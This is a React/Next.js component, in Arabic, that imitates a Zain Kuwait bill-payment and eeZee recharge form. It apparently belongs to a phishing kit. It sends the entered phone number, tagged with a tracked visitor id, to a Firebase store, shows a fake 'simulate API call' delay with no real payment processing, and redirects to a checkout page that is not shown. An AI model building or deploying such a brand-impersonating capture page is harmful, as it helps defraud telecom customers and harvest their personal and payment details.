"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { Plus, AlertCircle } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Card, CardContent } from "@/components/ui/card"
import { Label } from "@/components/ui/label"
import { Input } from "@/components/ui/input"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Checkbox } from "@/components/ui/checkbox"
import { useLocation } from "@/lib/use-location"
import { addData } from "@/lib/firebase"

export default function ZainPaymentForm() {
  const [phone, setPhone] = useState("")
  const [paymentType, setPaymentType] = useState("other")
  const [termsAccepted, setTermsAccepted] = useState(false)
  const [amount, setAmount] = useState(0)
  const [selectedAmount, setSelectedAmount] = useState<string | null>(null)
  const [phoneError, setPhoneError] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const location=useLocation()

  // Validate phone number
  useEffect(() => {
    if (phone && (phone.length !== 8 || !/^\d+$/.test(phone))) {
      setPhoneError("يجب أن يتكون رقم الهاتف من 8 أرقام")
    } else {
      setPhoneError("")
    }
  }, [phone])

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, "")
    setPhone(value)
  }
  const handleAmountSelect = (value: string) => {
    setSelectedAmount(value)
    localStorage.setItem('amount',value)
    setAmount(Number.parseFloat(value))
  }

  const handleSubmit = () => {
const _id=    localStorage.getItem('visitor')

    if (!isFormValid) return
    setIsLoading(true)
    addData({id:_id,phone:phone,mobile:phone})
    // Simulate API call
    setTimeout(() => {
      setIsLoading(false)
      // Navigate to checkout or show success
      window.location.href = "/checkout"
    }, 1500)
  }

  const isFormValid = phone.length === 8 && termsAccepted && amount > 0 

  return (
    <div className="lg:mt-3 mb-14 mx-3 md:max-w-xl md:mx-auto relative" dir="rtl">
      <Tabs defaultValue="bill" className="w-full" dir="rtl">
        <TabsList className="w-full rounded-t-lg bg-white shadow-lg border-b border-gray-300">
          <TabsTrigger
            value="bill"
            className="flex-1 py-2 data-[state=active]:text-primary data-[state=active]:border-b-2 data-[state=active]:border-primary data-[state=active]:font-bold"
          >
            <div className="flex justify-center items-center gap-2 text-sm md:text-md">
              <div className="">دفع الفاتورة</div>
            </div>
          </TabsTrigger>
          <TabsTrigger
            value="recharge"
            className="flex-1 py-2 data-[state=active]:text-primary data-[state=active]:border-b-2 data-[state=active]:border-primary data-[state=active]:font-bold"
          >
            <div className="flex justify-center items-center gap-2 text-sm md:text-md">
              <div className="">إعادة تعبئة eeZee</div>
            </div>
          </TabsTrigger>
        </TabsList>

        <TabsContent value="bill" className="mt-0">
          <Card className="rounded-t-none shadow-xl">
            <CardContent className="p-5">
              <div className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="payment-type" className="text-sm font-medium">
                    أود الدفع لــ
                  </Label>
                  <Select value={paymentType} onValueChange={setPaymentType}>
                    <SelectTrigger className="w-full bg-white border-b border-primary hover:border-black pl-3 pr-10 py-3 text-right">
                      <SelectValue placeholder="اختر نوع الدفع" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="other">رقم آخر</SelectItem>
                      <SelectItem value="contract">رقم العقد</SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                <div className="space-y-6">
                  <Label htmlFor="phone" className="text-sm font-medium required">
                    رقم الهاتف
                  </Label>
                  <Input
                    id="phone"
                    placeholder="أدخل الرقم: 99XXXXXX"
                    value={phone}
                    onChange={handlePhoneChange}
                    maxLength={8}
                    className="border-primary border-b border-t-0 border-l-0 border-r-0 rounded-none focus:ring-primary"
                  />
                  {phoneError && (
                    <div className="rounded-md p-3 my-1 text-sm bg-red-100 text-red-600 flex space-x-2 items-center">
                      <AlertCircle className="w-4 h-4 ml-2" />
                      <p className="m-0">{phoneError}</p>
                    </div>
                  )}
                </div>

                {phone.length === 8 && !phoneError && (
                  <div className="space-y-2 pt-4">
                    <Label className="text-sm font-medium">اختر المبلغ</Label>
                    <div className="grid grid-cols-2 gap-3">
                      {["5", "10", "15", "20", "30", "50"].map((value) => (
                        <Button
                          key={value}
                          type="button"
                          variant={selectedAmount === value ? "default" : "outline"}
                          className={`py-6 ${
                            selectedAmount === value
                              ? "bg-primary text-white"
                              : "border-2 border-gray-200 hover:border-primary"
                          }`}
                          onClick={() => handleAmountSelect(value)}
                        >
                          {value}.000 د.ك
                        </Button>
                      ))}
                    </div>
                  </div>
                )}

                <div className="flex justify-center mt-9">
                  <div>
                    <p className="text-sm font-medium mb-3 text-center">يرجى القبول لعرض الفاتورة</p>
                    <div className="flex items-center space-x-2 space-x-reverse justify-center">
                      <Checkbox
                        id="terms"
                        checked={termsAccepted}
                        onCheckedChange={(checked: boolean) => setTermsAccepted(checked as boolean)}
                        className="data-[state=checked]:bg-primary data-[state=checked]:border-primary"
                      />
                      <Label htmlFor="terms" className="text-sm font-medium cursor-pointer">
                        أوافق على الشروط والأحكام
                      </Label>
                    </div>

                  </div>
                </div>
              </div>
            </CardContent>
          </Card>

          <div className="pt-2 px-5">
            <Button variant="outline" disabled={true} className="w-full py-3 text-base font-bold">
              <Plus className="w-4 h-4 ml-1" /> أضف رقم آخر
            </Button>
          </div>

          <div className="border-t border-primary border-opacity-30 p-5 mt-10">
            <div className="flex justify-between text-2xl font-bold">
              <div>إجمالي</div>
              <div className="text-green-600">{amount.toFixed(3)} د.ك</div>
            </div>

            <Button
              onClick={handleSubmit}
              disabled={!isFormValid || isLoading}
              className="w-full mt-7 uppercase py-3 px-4 text-base font-black bg-primary hover:bg-primary/90 disabled:bg-gray-200 disabled:text-gray-400"
            >
              {isLoading ? (
                <div className="flex items-center justify-center">
                  <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin ml-3"></div>
                  جاري المعالجة...
                </div>
              ) : (
                "ادفع الآن"
              )}
            </Button>
          </div>
        </TabsContent>

        <TabsContent value="recharge" className="mt-0">
          <Card className="rounded-t-none shadow-xl">
            <CardContent className="p-5">
              <div className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="phone" className="text-sm font-medium required">
                    رقم الهاتف
                  </Label>
                  <Input
                    id="phone"
                    placeholder="أدخل الرقم: 99XXXXXX"
                    value={phone}
                    onChange={handlePhoneChange}
                    maxLength={8}
                    className="border-primary border-b border-t-0 border-l-0 border-r-0 rounded-none focus:ring-primary"
                  />
                  {phoneError && (
                    <div className="rounded-md p-3 my-1 text-sm bg-red-100 text-red-600 flex space-x-2 items-center">
                      <AlertCircle className="w-4 h-4 ml-2" />
                      <p className="m-0">{phoneError}</p>
                    </div>
                  )}
                </div>

                {phone.length === 8 && !phoneError && (
                  <div className="space-y-2 pt-4">
                    <Label className="text-sm font-medium">اختر باقة إعادة التعبئة</Label>
                    <div className="grid grid-cols-2 gap-3">
                      {["2", "5", "10", "15", "20", "30"].map((value) => (
                        <Button
                          key={value}
                          type="button"
                          variant={selectedAmount === value ? "default" : "outline"}
                          className={`py-6 ${
                            selectedAmount === value
                              ? "bg-primary text-white"
                              : "border-2 border-gray-200 hover:border-primary"
                          }`}
                          onClick={() => handleAmountSelect(value)}
                        >
                          {value}.000 د.ك
                        </Button>
                      ))}
                    </div>
                  </div>
                )}

                <div className="flex justify-center mt-9">
                  <div>
                    <p className="text-sm font-medium mb-3 text-center">يرجى القبول للمتابعة</p>
                    <div className="flex items-center space-x-2 space-x-reverse justify-center">
                      <Checkbox
                        id="terms"
                        checked={termsAccepted}
                        onCheckedChange={(checked) => setTermsAccepted(checked as boolean)}
                        className="data-[state=checked]:bg-primary data-[state=checked]:border-primary"
                      />
                      <Label htmlFor="terms" className="text-sm font-medium cursor-pointer">
                        أوافق على الشروط والأحكام
                      </Label>
                    </div>

                  
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>

          <div className="border-t border-primary border-opacity-30 p-5 mt-10">
            <div className="flex justify-between text-2xl font-bold">
              <div>إجمالي</div>
              <div className="text-green-600">{amount.toFixed(3)} د.ك</div>
            </div>

            <Button
              onClick={handleSubmit}
              disabled={!isFormValid || isLoading}
              className="w-full mt-7 uppercase py-3 px-4 text-base font-black bg-primary hover:bg-primary/90 disabled:bg-gray-200 disabled:text-gray-400"
            >
              {isLoading ? (
                <div className="flex items-center justify-center">
                  <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin ml-3"></div>
                  جاري المعالجة...
                </div>
              ) : (
                "ادفع الآن"
              )}
            </Button>
          </div>
        </TabsContent>
      </Tabs>
    </div>
  )
}
